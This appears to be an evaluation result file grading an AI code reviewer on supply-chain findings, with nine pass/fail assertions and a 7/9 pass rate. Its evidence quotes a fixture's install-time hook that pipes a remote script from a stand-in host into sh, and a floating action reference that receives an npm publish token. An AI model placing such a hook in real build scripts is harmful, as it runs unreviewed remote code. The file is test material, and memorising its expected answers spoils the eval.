@@ -1,0 +1,73 @@
+{
+  "eval_id": 41,
+  "eval_name": "eval-build-integrity",
+  "condition": "with_skill",
+  "skill_consulted": true,
+  "files_read": [
+    "evals/fixtures/build_integrity.py",
+    "evals/**/*",
+    "evals/fixtures/typosquat_dependency.py",
+    "evals/fixtures/vendored_fork.py",
+    "evals/README.md",
+    "SKILL.md",
+    "domains/leanness/supply-chain/sub-leaf.md",
+    "domains/leanness/supply-chain/guidelines/build-integrity.md",
+    "shared/output-format.md",
+    "shared/severity-and-rules.md",
+    "domains/leanness/supply-chain/guidelines/lockfile-integrity.md",
+    "domains/leanness/leaf.md"
+  ],
+  "assertion_results": [
+    {
+      "text": "Exactly 2 findings above Info severity",
+      "passed": false,
+      "evidence": "The header reads \"3 findings · C:2 M:1 m:0 i:0\", and a third [MAJOR] finding is reported, so more than 2 findings are above Info severity."
+    },
+    {
+      "text": "Both findings are graded CRITICAL",
+      "passed": true,
+      "evidence": "The first two findings are both headed \"[CRITICAL]\"."
+    },
+    {
+      "text": "Both findings are on axis L5 (Supply Chain)",
+      "passed": true,
+      "evidence": "Both the first and second findings list \"**Domain:** Leanness / Supply Chain (L5)\"."
+    },
+    {
+      "text": "Finding 1 identifies the install-time hook executing a remote download",
+      "passed": true,
+      "evidence": "Finding 1 quotes `execSync('curl -fsSL https://cdn.example-tools.test/bootstrap.sh | sh', ...)` as the install-time hook executing a remote download."
+    },
+    {
+      "text": "Finding 1 identifies that install scripts run before any review of the resolved tree",
+      "passed": true,
+      "evidence": "Finding 1 states \"The `COPY . .`-after-install ordering puts this in the earliest layer, before any source-level gate could run\" and that the reviewed tree is byte-identical to the last build."
+    },
+    {
+      "text": "Finding 2 identifies a mutable action or image reference (floating tag rather than SHA or digest)",
+      "passed": true,
+      "evidence": "Finding 2 quotes `uses: some-vendor/npm-publish-action@main` and `FROM node:20` (no digest) plus a `:latest` push as floating references."
+    },
+    {
+      "text": "Finding 2 notes the release job publishes with the runner's NPM_TOKEN",
+      "passed": true,
+      "evidence": "Finding 2's title says the action \"receives the publish token\" and the evidence shows `token: ${{ secrets.NPM_TOKEN }}`."
+    },
+    {
+      "text": "Both fixes pin to an immutable reference or gate the script",
+      "passed": true,
+      "evidence": "Finding 1's fix gates scripts via `npm ci --ignore-scripts` and an allowlist/digest-pinned artifact, while Finding 2's fix pins every `uses:` to a 40-char SHA and `FROM node:20@sha256:<digest>`."
+    },
+    {
+      "text": "Header matches pattern: 2 findings · C:2 M:0 m:0 i:0",
+      "passed": false,
+      "evidence": "The header says \"3 findings · C:2 M:1 m:0 i:0 · Sub-Domain Score: 40/100 (Grade F)\", not the expected \"2 findings · C:2 M:0 m:0 i:0\"."
+    }
+  ],
+  "summary": {
+    "passed": 7,
+    "failed": 2,
+    "total": 9,
+    "pass_rate": 0.7778
+  }
+}
